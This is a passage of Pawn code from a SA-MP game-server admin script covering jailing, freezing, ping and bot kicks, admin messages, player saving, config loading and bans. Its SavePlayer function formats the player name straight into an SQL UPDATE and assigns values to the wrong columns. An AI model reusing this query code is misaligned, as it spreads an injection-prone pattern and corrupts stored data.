	SetPlayerCameraPos(player1,x+3,y,z); SetPlayerCameraLookAt(player1,x,y,z);
}

forward JailPlayer(player1);
public JailPlayer(player1)
{
	TogglePlayerControllable(player1,true);
	SetPlayerPos(player1,197.6661,173.8179,1003.0234);
	SetPlayerInterior(player1,3);
	SetCameraBehindPlayer(player1);
	JailTimer[player1] = SetTimerEx("JailRelease",PlayerInfo[player1][JailTime],0,"d",player1);
	PlayerInfo[player1][Jailed] = 1;
}

forward JailRelease(player1);
public JailRelease(player1)
{
	KillTimer( JailTimer[player1] );
	PlayerInfo[player1][JailTime] = 0;  PlayerInfo[player1][Jailed] = 0;
	SetPlayerInterior(player1,0); SetPlayerPos(player1, 0.0, 0.0, 0.0); SpawnPlayer(player1);
	PlayerPlaySound(player1,1057,0.0,0.0,0.0);

	GameTextForPlayer(player1,"~g~Released ~n~From Jail",3000,3);
}

//------------------------------------------------------------------------------
forward UnFreezeMe(player1);
public UnFreezeMe(player1)
{
	KillTimer( FreezeTimer[player1] );
	TogglePlayerControllable(player1,true);   PlayerInfo[player1][Frozen] = 0;
	PlayerPlaySound(player1,1057,0.0,0.0,0.0);	GameTextForPlayer(player1,"~g~Unfrozen",3000,3);
}

//==============================================================================
forward RepairCar(playerid);
public RepairCar(playerid)
{
	if(IsPlayerInAnyVehicle(playerid)) SetVehiclePos(GetPlayerVehicleID(playerid),Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]+0.5);
	SetVehicleZAngle(GetPlayerVehicleID(playerid), Pos[playerid][3]);
	SetCameraBehindPlayer(playerid);
}

//============================ [ Timers ]=======================================
//==============================================================================
//==========================[ Server Info  ]====================================

forward ConnectedPlayers();
public ConnectedPlayers()
{
	new Connected;
	foreach(Player, i)
	{
		Connected++;
	}
	return Connected;
}

forward JailedPlayers();
public JailedPlayers()
{
	new JailedCount;
	foreach(Player, i)
	{
		if(PlayerInfo[i][Jailed] == 1) JailedCount++;
	}
	return JailedCount;
}

forward FrozenPlayers();
public FrozenPlayers()
{
	new FrozenCount;
	foreach(Player, i)
	{
		if(PlayerInfo[i][Frozen] == 1) FrozenCount++;
	}
	return FrozenCount;
}

forward MutedPlayers();
public MutedPlayers()
{
	new coun;
	foreach(Player, i)
	{
		if(PlayerInfo[i][Muted] == 1) coun++;
	}
	return coun;
}

forward InVehCount();
public InVehCount()
{
	new InVeh;
	foreach(Player, i)
	{
	 	if(IsPlayerInAnyVehicle(i)) InVeh++;
	}
	return InVeh;
}

forward OnBikeCount();
public OnBikeCount()
{
	new BikeCount;
	foreach(Player, i)
	{
		if(IsPlayerInAnyVehicle(i))
		{
			new LModel = GetVehicleModel(GetPlayerVehicleID(i));
			switch(LModel)
			{
				case 448,461,462,463,468,471,509,510,521,522,523,581,586:  BikeCount++;
			}
		}
	}
	return BikeCount;
}

forward InCarCount();
public InCarCount()
{
	new PInCarCount;
	foreach(Player, i)
	{
		if(IsPlayerInAnyVehicle(i))
		{
			new LModel = GetVehicleModel(GetPlayerVehicleID(i));
			switch(LModel)
			{
				case 448,461,462,463,468,471,509,510,521,522,523,581,586: {}
				default: PInCarCount++;
			}
		}
	}
	return PInCarCount;
}

forward AdminCount();
public AdminCount()
{
	new LAdminCount;
	foreach(Player, i)
	{
		if(PlayerInfo[i][Level] >= 1)	LAdminCount++;
	}
	return LAdminCount;
}

forward RconAdminCount();
public RconAdminCount()
{
	new rAdminCount;
	foreach(Player, i)
	{
		if(IsPlayerAdmin(i)) rAdminCount++;
	}
	return rAdminCount;
}

//==========================[ Remote Console ]==================================

forward UnloadFS();
public UnloadFS()
{
	SendRconCommand("unloadfs ladmin4");
}

forward PrintWarning(const string[]);
public PrintWarning(const string[])
{
    new str[128];
    print("\n\n>		WARNING:\n");
    format(str, sizeof(str), " The  %s  folder is missing from scriptfiles", string);
    print(str);
    print("\n Please Create This Folder And Reload the Filterscript\n\n");
}

//============================[ Bot Check ]=====================================
forward BotCheck(playerid);
public BotCheck(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(GetPlayerPing(playerid) < 1)
		{
			new string[128], ip[20];  GetPlayerIp(playerid,ip,sizeof(ip));
			format(string,sizeof(string),"BOT: %s id:%d ip: %s ping: %d",PlayerName2(playerid),playerid,ip,GetPlayerPing(playerid));
			SaveToFile("BotKickLog",string);
		    SaveToFile("KickLog",string);
			printf("[ADMIN] Possible bot has been detected (Kicked %s ID:%d)", PlayerName2(playerid), playerid);
			Kick(playerid);
		}
	}
}

forward PingKick();
public PingKick()
{
	if(ServerInfo[MaxPing] != 0)
	{
	    PingPos++; if(PingPos > PING_MAX_EXCEEDS) PingPos = 0;

		for(new i=0; i<MAX_PLAYERS; i++)
		{
			PlayerInfo[i][pPing][PingPos] = GetPlayerPing(i);

		    if(GetPlayerPing(i) > ServerInfo[MaxPing])
			{
				if(PlayerInfo[i][PingCount] == 0) PlayerInfo[i][PingTime] = TimeStamp();

	   			PlayerInfo[i][PingCount]++;
				if(TimeStamp() - PlayerInfo[i][PingTime] > PING_TIMELIMIT)
				{
	    			PlayerInfo[i][PingTime] = TimeStamp();
					PlayerInfo[i][PingCount] = 1;
				}
				else if(PlayerInfo[i][PingCount] >= PING_MAX_EXCEEDS)
				{
				    new Sum, x, string[128];
					while (x < PING_MAX_EXCEEDS) {
						Sum += PlayerInfo[i][pPing][x];
						x++;
					}
					format(string,sizeof(string),"%s has been kicked from the server. [Reason: High Ping %d/%d]", PlayerName2(i), GetPlayerPing(i), ServerInfo[MaxPing] );
  		    		SendClientMessageToAll(red,string);
					SaveToFile("KickLog",string);
					Kick(i);
				}
			}
			else if(GetPlayerPing(i) < 1 && ServerInfo[AntiBot] == 1)
		    {
				PlayerInfo[i][BotPing]++;
				if(PlayerInfo[i][BotPing] >= 3) BotCheck(i);
		    }
		    else
			{
				PlayerInfo[i][BotPing] = 0;
			}
		}
	}

	#if defined ANTI_MINIGUN
	new weap, ammo;
	foreach(Player, i)
	{
		if(IsPlayerConnected(i) && PlayerInfo[i][Level] == 0 && MinigunDM[i] == 0)
		{
			GetPlayerWeaponData(i, 7, weap, ammo);
			if(ammo > 1 && weap == 38) {
				new string[128]; format(string,sizeof(string),"INFO: %s has a mingun with %d ammo", PlayerName2(i), ammo);
				SendClientMessage(i,red, "You You Have Been Kicked For Minigun Hack.");
				format(string,sizeof(string),"%s Has Been Kicked By Whizard Dumble Door For Minigun Hack.",PlayerName2(i), ammo);
				SendClientMessageToAll(red, string);  print(string);
				SaveToFile("KickLog",string);  Kick(i);
				MessageToAdmins(COLOR_WHITE,string);
			}
		}
	}
	#endif
}

//==============================================================================
forward PutAtPos(playerid);
public PutAtPos(playerid)
{
	if (dUserINT(PlayerName2(playerid)).("x")!=0) {
     	SetPlayerPos(playerid, float(dUserINT(PlayerName2(playerid)).("x")), float(dUserINT(PlayerName2(playerid)).("y")), float(dUserINT(PlayerName2(playerid)).("z")) );
 		SetPlayerInterior(playerid,	(dUserINT(PlayerName2(playerid)).("interior"))	);
	}
}

forward PutAtDisconectPos(playerid);
public PutAtDisconectPos(playerid)
{
	if (dUserINT(PlayerName2(playerid)).("x1")!=0) {
    	SetPlayerPos(playerid, float(dUserINT(PlayerName2(playerid)).("x1")), float(dUserINT(PlayerName2(playerid)).("y1")), float(dUserINT(PlayerName2(playerid)).("z1")) );
		SetPlayerInterior(playerid,	(dUserINT(PlayerName2(playerid)).("interior1"))	);
	}
}

TotalGameTime(playerid, &h=0, &m=0, &s=0)
{
    PlayerInfo[playerid][TotalTime] = ( (gettime() - PlayerInfo[playerid][ConnectTime]) + (PlayerInfo[playerid][hours]*60*60) + (PlayerInfo[playerid][mins]*60) + (PlayerInfo[playerid][secs]) );

    h = floatround(PlayerInfo[playerid][TotalTime] / 3600, floatround_floor);
    m = floatround(PlayerInfo[playerid][TotalTime] / 60,   floatround_floor) % 60;
    s = floatround(PlayerInfo[playerid][TotalTime] % 60,   floatround_floor);

    return PlayerInfo[playerid][TotalTime];
}

//==============================================================================
MaxAmmo(playerid)
{
	new slot, weap, ammo;
	for (slot = 0; slot < 14; slot++)
	{
    	GetPlayerWeaponData(playerid, slot, weap, ammo);
		if(IsValidWeapon(weap))
		{
		   	GivePlayerWeapon(playerid, weap, 99999);
		}
	}
	return 1;
}

stock PlayerName2(playerid) {
  new name[MAX_PLAYER_NAME];
  GetPlayerName(playerid, name, sizeof(name));
  return name;
}
stock GetIp(playerid)
{
	new ip[16];
	GetPlayerIp(playerid, ip, 16);
	return ip;
}

stock pName(playerid)
{
  new name[MAX_PLAYER_NAME];
  GetPlayerName(playerid, name, sizeof(name));
  return name;
}

stock TimeStamp()
{
	new time = GetTickCount() / 1000;
	return time;
}

stock PlayerSoundForAll(SoundID)
{
	foreach(Player, i)
	{
		PlayerPlaySound(i, SoundID, 0.0, 0.0, 0.0);
	}
}

stock IsValidWeapon(weaponid)
{
    if (weaponid > 0 && weaponid < 19 || weaponid > 21 && weaponid < 47) return 1;
    return 0;
}

stock IsValidSkin(SkinID)
{
	if((SkinID == 0)||(SkinID == 7)||(SkinID >= 9 && SkinID <= 41)||(SkinID >= 43 && SkinID <= 64)||(SkinID >= 66 && SkinID <= 73)||(SkinID >= 75 && SkinID <= 85)||(SkinID >= 87 && SkinID <= 118)||(SkinID >= 120 && SkinID <= 148)||(SkinID >= 150 && SkinID <= 207)||(SkinID >= 209 && SkinID <= 264)||(SkinID >= 274 && SkinID <= 288)||(SkinID >= 290 && SkinID <= 299)) return true;
	else return false;
}

stock IsNumeric(string[])
{
	for (new i = 0, j = strlen(string); i < j; i++)
	{
		if (string[i] > '9' || string[i] < '0') return 0;
	}
	return 1;
}

stock IsNumeric5(string[])
{
	for (new i = 0, j = strlen(string); i < j; i++)
	{
		if (string[i] > '5' || string[i] < '0') return 0;
	}
	return 1;
}

stock ReturnPlayerID(PlayerName[])
{
	foreach(Player, i)
	{
		if(IsPlayerConnected(i))
		{
			if(strfind(pName(i),PlayerName,true)!=-1) return i;
		}
	}
	return INVALID_PLAYER_ID;
}

GetVehicleModelIDFromName(vname[])
{
	for(new i = 0; i < 211; i++)
	{
		if ( strfind(VehicleNames[i], vname, true) != -1 )
			return i + 400;
	}
	return -1;
}

stock GetWeaponIDFromName(WeaponName[])
{
	if(strfind("molotov",WeaponName,true)!=-1) return 18;
	for(new i = 0; i <= 46; i++)
	{
		switch(i)
		{
			case 0,19,20,21,44,45: continue;
			default:
			{
				new name[32]; GetWeaponName(i,name,32);
				if(strfind(name,WeaponName,true) != -1) return i;
			}
		}
	}
	return -1;
}

stock DisableWord(const badword[], text[])
{
   	for(new i=0; i<256; i++)
   	{
		if (strfind(text[i], badword, true) == 0)
		{
			for(new a=0; a<256; a++)
			{
				if (a >= i && a < i+strlen(badword)) text[a]='*';
			}
		}
	}
}

argpos(const string[], idx = 0, sep = ' ')// (by yom)
{
    for(new i = idx, j = strlen(string); i < j; i++)
        if (string[i] == sep && string[i+1] != sep)
            return i+1;

    return -1;
}

//==============================================================================
forward MessageToAdmins2plus(color,const string[]);
public MessageToAdmins2plus(color,const string[])
{
	foreach(Player, i)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Level] >= 2 || IsPlayerAdmin(i)) SendClientMessage(i, color, string);
	}
	return 1;
}


forward MessageToAdmins(color,const string[]);
public MessageToAdmins(color,const string[])
{
	foreach(Player, i)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Level] >= 1 || IsPlayerAdmin(i) || PlayerInfo[i][Helper] == 1) SendClientMessage(i, color, string);
	}
	return 1;
}
forward MessageTo4(color,const string[]);
public MessageTo4(color,const string[])
{
	foreach(Player, i)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Level] >= 4 || IsPlayerAdmin(i)) SendClientMessage(i, color, string);
	}
	return 1;
}
forward MessageToTwice(color,const string[]);
public MessageToTwice(color,const string[])
{
	foreach(Player, i)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Level] >= 1 || PlayerInfo[i][Helper] == 1 || IsPlayerAdmin(i)) SendClientMessage(i, color, string);
	}
	return 1;
}

forward MessageTo5(color,const string[]);
public MessageTo5(color,const string[])
{
	foreach(Player, i)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Level] >= 5 || IsPlayerAdmin(i)) SendClientMessage(i, color, string);
	}
	return 1;
}
forward MessageToOwner(color,const string[]);
public MessageToOwner(color,const string[])
{
	foreach(Player, i)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Level] >= 9 || IsPlayerAdmin(i)) SendClientMessage(i, color, string);
	}
	return 1;
}
forward MessageToDonor(color,const string[]);
public MessageToDonor(color,const string[])
{
	foreach(Player, i)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][dRank] >= 1) SendClientMessage(i, color, string);
	}
	return 1;
}
forward MessageTo6(color,const string[]);
public MessageTo6(color,const string[])
{
	foreach(Player, i)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Level] >= 6 || IsPlayerAdmin(i)) SendClientMessage(i, color, string);
	}
	return 1;
}

stock CMDMessageToAdmins(playerid,command[])
{
	if(ServerInfo[AdminCmdMsg] == 0) return 1;
	new string[128]; GetPlayerName(playerid,string,sizeof(string));
	format(string,sizeof(string),"[INFO] %s has used command %s",string,command);
	MessageToTwice(C_LBLUE,string);
	#if defined IRCENABLED
	format(string,sizeof(string),"2[INFO] %s has used command %s",string,command);
	IRC_GroupSay(gGroupID, IRC_ADMINCHANNEL, string);
	#endif
	
	return 1;
}

//==============================================================================

//************************************** DINI DUMP BY ABHAY***********************
/*
SavePlayer(playerid)
{
   	dUserSetINT(PlayerName2(playerid)).("money",GetPlayerMoney(playerid));
   	dUserSetINT(PlayerName2(playerid)).("kills",PlayerInfo[playerid][Kills]);
   	dUserSetINT(PlayerName2(playerid)).("deaths",PlayerInfo[playerid][Deaths]);
   	dUserSetINT(PlayerName2(playerid)).("Score",GetPlayerScore(playerid));
   	dUserSetINT(PlayerName2(playerid)).("Help Operator",PlayerInfo[playerid][Helper]);
   	dUserSetINT(PlayerName2(playerid)).("Donor",PlayerInfo[playerid][dRank]);

	new h, m, s;
    TotalGameTime(playerid, h, m, s);

	dUserSetINT(PlayerName2(playerid)).("hours", h);
	dUserSetINT(PlayerName2(playerid)).("minutes", m);
	dUserSetINT(PlayerName2(playerid)).("seconds", s);

   	new Float:x,Float:y,Float:z, interior;
   	GetPlayerPos(playerid,x,y,z);	interior = GetPlayerInterior(playerid);
    dUserSetINT(PlayerName2(playerid)).("x1",floatround(x));
	dUserSetINT(PlayerName2(playerid)).("y1",floatround(y));
	dUserSetINT(PlayerName2(playerid)).("z1",floatround(z));
    dUserSetINT(PlayerName2(playerid)).("interior1",interior);

	new weap1, ammo1, weap2, ammo2, weap3, ammo3, weap4, ammo4, weap5, ammo5, weap6, ammo6;
	GetPlayerWeaponData(playerid,2,weap1,ammo1);// hand gun
	GetPlayerWeaponData(playerid,3,weap2,ammo2);//shotgun
	GetPlayerWeaponData(playerid,4,weap3,ammo3);// SMG
	GetPlayerWeaponData(playerid,5,weap4,ammo4);// AK47 / M4
	GetPlayerWeaponData(playerid,6,weap5,ammo5);// rifle
	GetPlayerWeaponData(playerid,7,weap6,ammo6);// rocket launcher
   	dUserSetINT(PlayerName2(playerid)).("weap1",weap1); dUserSetINT(PlayerName2(playerid)).("weap1ammo",ammo1);
  	dUserSetINT(PlayerName2(playerid)).("weap2",weap2);	dUserSetINT(PlayerName2(playerid)).("weap2ammo",ammo2);
  	dUserSetINT(PlayerName2(playerid)).("weap3",weap3);	dUserSetINT(PlayerName2(playerid)).("weap3ammo",ammo3);
	dUserSetINT(PlayerName2(playerid)).("weap4",weap4); dUserSetINT(PlayerName2(playerid)).("weap4ammo",ammo4);
  	dUserSetINT(PlayerName2(playerid)).("weap5",weap5);	dUserSetINT(PlayerName2(playerid)).("weap5ammo",ammo5);
	dUserSetINT(PlayerName2(playerid)).("weap6",weap6); dUserSetINT(PlayerName2(playerid)).("weap6ammo",ammo6);

	new	Float:health;	GetPlayerHealth(playerid, Float:health);
	new	Float:armour;	GetPlayerArmour(playerid, Float:armour);
	new year,month,day;	getdate(year, month, day);
	new strdate[20];	format(strdate, sizeof(strdate), "%d/%d/%d",day,month,year);
	new file[256]; 		format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(PlayerName2(playerid)) );

	dUserSetINT(PlayerName2(playerid)).("health",floatround(health));
    dUserSetINT(PlayerName2(playerid)).("armour",floatround(armour));
	dini_Set(file,"LastOn",strdate);
	dUserSetINT(PlayerName2(playerid)).("loggedin",0);
	dUserSetINT(PlayerName2(playerid)).("TimesOnServer",(dUserINT(PlayerName2(playerid)).("TimesOnServer"))+1);
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid,name,sizeof(name));
	dini_Set(file,"Nick",name);
}
*/
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
stock SavePlayer(playerid)
{
	if(Logged[playerid] == 1 && buggy[playerid] == 0 && IsPlayerSpawned[playerid] == true)
	{
        //If the player disconnects before registering,
        //we want to make sure it doesn't try update
        //so we check if the player is logged in.
        new score = GetPlayerScore(playerid); //Gets players score
        new money = GetPlayerMoney(playerid); //Gets players money
        new query[200], pname[24]; //Creates the variables
        GetPlayerName(playerid, pname, 24); //Gets the players name.
        new h, m, s; TotalGameTime(playerid, h, m, s);
        format(query, sizeof(query), "UPDATE Accounts SET Score=%d, Cash=%d, Level=%d, Coins=%d, Kills=%d, Deaths=%d, Vip=%d, Kicks=%d, Bans=%d, Jails=%d WHERE Name='%s'", score, money, TempAdmin[playerid], PlayerInfo[playerid][Helper], PlayerInfo[playerid][Kills], PlayerInfo[playerid][Deaths], PlayerInfo[playerid][dRank], h, m, s, pname);
        mysql_query(query);
        //No need to store a result for a update string
	}
	else SendClientMessage(playerid, 0xFFCC66FF, "You Are Not Registered or Logged IN!!! Use /register or /login");
}

//==============================================================================
#if defined USE_MENUS
DestroyAllMenus()
{
	DestroyMenu(LVehicles); DestroyMenu(twodoor); DestroyMenu(fourdoor); DestroyMenu(fastcar); DestroyMenu(Othercars);
	DestroyMenu(bikes); DestroyMenu(boats); DestroyMenu(planes); DestroyMenu(helicopters ); DestroyMenu(LTime);
	DestroyMenu(XWeapons); DestroyMenu(XWeaponsBig); DestroyMenu(XWeaponsSmall); DestroyMenu(XWeaponsMore);
	DestroyMenu(LWeather); DestroyMenu(LTuneMenu); DestroyMenu(PaintMenu); DestroyMenu(LCars); DestroyMenu(LCars2);
	DestroyMenu(LTele); DestroyMenu(LasVenturasMenu); DestroyMenu(LosSantosMenu); DestroyMenu(SanFierroMenu);
	DestroyMenu(LMainMenu); DestroyMenu(DesertMenu); DestroyMenu(FlintMenu); DestroyMenu(MountChiliadMenu); DestroyMenu(InteriorsMenu);
	DestroyMenu(AdminEnable); DestroyMenu(AdminDisable);
}
#endif

//==============================================================================
#if defined DISPLAY_CONFIG
stock ConfigInConsole()
{
	print(" ________ Configuration ___________\n");
	print(" __________ Chat & Messages ______");
	if(ServerInfo[AntiSwear] == 0) print("  Anti Swear:              Disabled "); else print("  Anti Swear:             Enabled ");
	if(ServerInfo[AntiSpam] == 0)  print("  Anti Spam:               Disabled "); else print("  Anti Spam:              Enabled ");
	if(ServerInfo[ReadCmds] == 0)  print("  Read Cmds:               Disabled "); else print("  Read Cmds:              Enabled ");
	if(ServerInfo[ReadPMs] == 0)   print("  Read PMs:                Disabled "); else print("  Read PMs:               Enabled ");
	if(ServerInfo[ConnectMessages] == 0) print("  Connect Messages:        Disabled "); else print("  Connect Messages:       Enabled ");
  	if(ServerInfo[AdminCmdMsg] == 0) print("  Admin Cmd Messages:     Disabled ");  else print("  Admin Cmd Messages:     Enabled ");
	if(ServerInfo[ReadPMs] == 0)   print("  Anti capital letters:    Disabled \n"); else print("  Anti capital letters:   Enabled \n");
	print(" __________ Skins ________________");
	if(ServerInfo[AdminOnlySkins] == 0) print("  AdminOnlySkins:         Disabled "); else print("  AdminOnlySkins:         Enabled ");
	printf("  Admin Skin 1 is:         %d", ServerInfo[AdminSkin] );
	printf("  Admin Skin 2 is:         %d\n", ServerInfo[AdminSkin2] );
	print(" ________ Server Protection ______");
	if(ServerInfo[AntiBot] == 0) print("  Anti Bot:                Disabled "); else print("  Anti Bot:                Enabled ");
	if(ServerInfo[NameKick] == 0) print("  Bad Name Kick:           Disabled\n"); else print("  Bad Name Kick:           Enabled\n");
	print(" __________ Ping Control _________");
	if(ServerInfo[MaxPing] == 0) print("  Ping Control:            Disabled"); else print("  Ping Control:            Enabled");
	printf("  Max Ping:                %d\n", ServerInfo[MaxPing] );
	print(" __________ Players ______________");
	if(ServerInfo[GiveWeap] == 0) print("  Save/Give Weaps:         Disabled"); else print("  Save/Give Weaps:         Enabled");
	if(ServerInfo[GiveMoney] == 0) print("  Save/Give Money:         Disabled\n"); else print("  Save/Give Money:         Enabled\n");
	print(" __________ Other ________________");
	printf("  Max Admin Level:         %d", ServerInfo[MaxAdminLevel] );
	if(ServerInfo[Locked] == 0) print("  Server Locked:           No"); else print("  Server Locked:           Yes");
	if(ServerInfo[AutoLogin] == 0) print("  Auto Login:             Disabled\n"); else print("  Auto Login:              Enabled\n");
}
#endif

//=====================[ Configuration ] =======================================
stock UpdateConfig()
{
	new file[256], File:file2, string[100]; format(file,sizeof(file),"ladmin/config/Config.sav");
	ForbiddenWordCount = 0;
	BadNameCount = 0;
	BadPartNameCount = 0;

	if(!dini_Exists("ladmin/config/aka.txt")) dini_Create("ladmin/config/aka.txt");

	if(!dini_Exists(file))
	{
		dini_Create(file);
		print("\n >Configuration File Successfully Created");
	}

	if(!dini_Isset(file,"MaxPing")) dini_IntSet(file,"MaxPing",1200);
	if(!dini_Isset(file,"ReadPms")) dini_IntSet(file,"ReadPMs",1);
	if(!dini_Isset(file,"ReadCmds")) dini_IntSet(file,"ReadCmds",1);
	if(!dini_Isset(file,"MaxAdminLevel")) dini_IntSet(file,"MaxAdminLevel",5);
	if(!dini_Isset(file,"AdminOnlySkins")) dini_IntSet(file,"AdminOnlySkins",0);
	if(!dini_Isset(file,"AdminSkin")) dini_IntSet(file,"AdminSkin",217);
	if(!dini_Isset(file,"AdminSkin2")) dini_IntSet(file,"AdminSkin2",214);
	if(!dini_Isset(file,"AntiBot")) dini_IntSet(file,"AntiBot",1);
	if(!dini_Isset(file,"AntiSpam")) dini_IntSet(file,"AntiSpam",1);
	if(!dini_Isset(file,"AntiSwear")) dini_IntSet(file,"AntiSwear",1);
	if(!dini_Isset(file,"NameKick")) dini_IntSet(file,"NameKick",1);
 	if(!dini_Isset(file,"PartNameKick")) dini_IntSet(file,"PartNameKick",1);
	if(!dini_Isset(file,"NoCaps")) dini_IntSet(file,"NoCaps",0);
	if(!dini_Isset(file,"Locked")) dini_IntSet(file,"Locked",0);
	if(!dini_Isset(file,"SaveWeap")) dini_IntSet(file,"SaveWeap",1);
	if(!dini_Isset(file,"SaveMoney")) dini_IntSet(file,"SaveMoney",1);
	if(!dini_Isset(file,"ConnectMessages")) dini_IntSet(file,"ConnectMessages",1);
	if(!dini_Isset(file,"AdminCmdMessages")) dini_IntSet(file,"AdminCmdMessages",1);
	if(!dini_Isset(file,"AutoLogin")) dini_IntSet(file,"AutoLogin",1);
	if(!dini_Isset(file,"MaxMuteWarnings")) dini_IntSet(file,"MaxMuteWarnings",4);
	if(!dini_Isset(file,"MustLogin")) dini_IntSet(file,"MustLogin",0);
	if(!dini_Isset(file,"MustRegister")) dini_IntSet(file,"MustRegister",0);

	if(dini_Exists(file))
	{
		ServerInfo[MaxPing] = dini_Int(file,"MaxPing");
		ServerInfo[ReadPMs] = dini_Int(file,"ReadPMs");
		ServerInfo[ReadCmds] = dini_Int(file,"ReadCmds");
		ServerInfo[MaxAdminLevel] = dini_Int(file,"MaxAdminLevel");
		ServerInfo[AdminOnlySkins] = dini_Int(file,"AdminOnlySkins");
		ServerInfo[AdminSkin] = dini_Int(file,"AdminSkin");
		ServerInfo[AdminSkin2] = dini_Int(file,"AdminSkin2");
		ServerInfo[AntiBot] = dini_Int(file,"AntiBot");
		ServerInfo[AntiSpam] = dini_Int(file,"AntiSpam");
		ServerInfo[AntiSwear] = dini_Int(file,"AntiSwear");
		ServerInfo[NameKick] = dini_Int(file,"NameKick");
		ServerInfo[PartNameKick] = dini_Int(file,"PartNameKick");
		ServerInfo[NoCaps] = dini_Int(file,"NoCaps");
		ServerInfo[Locked] = dini_Int(file,"Locked");
		ServerInfo[GiveWeap] = dini_Int(file,"SaveWeap");
		ServerInfo[GiveMoney] = dini_Int(file,"SaveMoney");
		ServerInfo[ConnectMessages] = dini_Int(file,"ConnectMessages");
		ServerInfo[AdminCmdMsg] = dini_Int(file,"AdminCmdMessages");
		ServerInfo[AutoLogin] = dini_Int(file,"AutoLogin");
		ServerInfo[MaxMuteWarnings] = dini_Int(file,"MaxMuteWarnings");
		ServerInfo[MustLogin] = dini_Int(file,"MustLogin");
		ServerInfo[MustRegister] = dini_Int(file,"MustRegister");
		print("\n -Configuration Settings Loaded");
	}

	//forbidden names
	if((file2 = fopen("ladmin/config/ForbiddenNames.cfg",io_readwrite)))
	{
		while(fread(file2,string))
		{
		    for(new i = 0, j = strlen(string); i < j; i++) if(string[i] == '\n' || string[i] == '\r') string[i] = '\0';
            BadNames[BadNameCount] = string;
            BadNameCount++;
		}
		fclose(file2);	printf(" -%d Forbidden Names Loaded", BadNameCount);
	}

	//forbidden part of names
	if((file2 = fopen("ladmin/config/ForbiddenPartNames.cfg",io_readwrite)))
	{
		while(fread(file2,string))
		{
		    for(new i = 0, j = strlen(string); i < j; i++) if(string[i] == '\n' || string[i] == '\r') string[i] = '\0';
            BadPartNames[BadPartNameCount] = string;
            BadPartNameCount++;
		}
		fclose(file2);	printf(" -%d Forbidden Tags Loaded", BadPartNameCount);
	}

	//forbidden words
	if((file2 = fopen("ladmin/config/ForbiddenWords.cfg",io_readwrite)))
	{
		while(fread(file2,string))
		{
		    for(new i = 0, j = strlen(string); i < j; i++) if(string[i] == '\n' || string[i] == '\r') string[i] = '\0';
            ForbiddenWords[ForbiddenWordCount] = string;
            ForbiddenWordCount++;
		}
		fclose(file2);	printf(" -%d Forbidden Words Loaded", ForbiddenWordCount);
	}
}
stock VBanID(playerid,giveid,reason[])
{
    format(NICKBAN,20,VBPlayer(giveid));
	if(playerid > -1)
	{
	    format(Vnewban,32,BanDir,VBPlayer(giveid));
		dini_Create(Vnewban);
		VBanSaveInfo(playerid,Vnewban,reason);
	}
	else
	{
	    format(Vnewban,32,BanDir,VBPlayer(giveid));
		dini_Create(Vnewban);
		VBanSaveInfo(-1,Vnewban,reason);
	}
	if(IsPlayerConnected(giveid))
		VBanLoadInfo(giveid,Vnewban);

	Kick(giveid);

    return 1;
}

stock ABanID(playerid,giveid,reason[])
{
    format(NICKBAN,20,VBPlayer(giveid));
	if(playerid > -1)
	{

	    GetPlayerIp(giveid, VIP, sizeof(VIP));
	    format(Vnewban,32,BanDir,VIP);
		dini_Create(Vnewban);
		VBanSaveInfo(playerid,Vnewban,reason);
	    format(Vnewban,32,BanDir,VBPlayer(giveid));
		dini_Create(Vnewban);
		VBanSaveInfo(playerid,Vnewban,reason);
	}
	else
	{
	    format(Vnewban,32,BanDir,VBPlayer(giveid));
		dini_Create(Vnewban);
		VBanSaveInfo(-1,Vnewban,reason);
	}
	if(IsPlayerConnected(giveid))
		VBanLoadInfo(giveid,Vnewban);

	Kick(giveid);

    return 1;
}


stock VBanNick(playerid,nick[],reason[])
{
    format(Vnewban,32,BanDir,nick);

    if(dini_Exists(Vnewban))
		return SendClientMessage(playerid, ErrorColor,""COL_BLUE"This username is already banned.");

	new giveid;
	giveid = VBReturnUser(nick);
	if(!IsPlayerConnected(giveid))
	{
        format(NICKBAN,20,nick);

		format(Vnewban,32,BanDir,VBPlayer(giveid));
		dini_Create(Vnewban);
	    return VBanSaveInfo(playerid,Vnewban,reason);
    }
	else
	    return VBanID(playerid,giveid,reason);
}

// lIne 22921 search VBanIP and uncomment

stock VBanIP(playerid,IP2[],reason[])
{
    format(Vnewban,32,BanDir,IP2);

    if(dini_Exists(Vnewban))
		return SendClientMessage(playerid, ErrorColor,""COL_BLUE"This IP is already banned.");

	if(playerid > -1)
	{
	    new ban;

		for(new i=0, j = GetMaxPlayers(); i < j; i++)
		    if(IsPlayerConnected(i))
		    {
			    GetPlayerIp(i, VIP, sizeof(VIP));
			    if(!strcmp(VIP, IP2))
			    {
			        ban++;
		            VBanID(playerid,i,reason);
	            }
            }

		if(ban == 0)
		{
	        dini_Create(Vnewban);

		    VBanSaveInfo(playerid,Vnewban,reason);
	    }
    }
    else
    {
        format(Vnewban,32,BanDir,IP2);
        dini_Create(Vnewban);

	    VBanSaveInfo(-1,Vnewban,"Ban Evade");
    }
    return 1;
}

stock VUnBan(playerid,Arq[])
{
    format(Vnewban,32,BanDir,Arq);
    if(!dini_Exists(Vnewban))
		return SendClientMessage(playerid, ErrorColor,""COL_BLUE"No Banned Found..");

	new BANNEDIP[32];
	format(BANNEDIP,32,BanDir,dini_Get(Vnewban,"IP"));
    if(dini_Exists(BANNEDIP))
    {
        new BANNEDACC[32];
        if(VBIsIP(Arq))
            format(Vstring,128,""COL_BLUE"The IP %s(%s) was unbanned by %s.",Arq,dini_Get(Vnewban,"Nick"),VBPlayer(playerid));
        else
	    	format(Vstring,128,""COL_BLUE"The account %s(%s) was unbanned by %s.",Arq,dini_Get(Vnewban,"IP"),VBPlayer(playerid));

    	format(BANNEDACC,32,BanDir,dini_Get(Vnewban,"Nick"));
		dini_Remove(BANNEDACC);
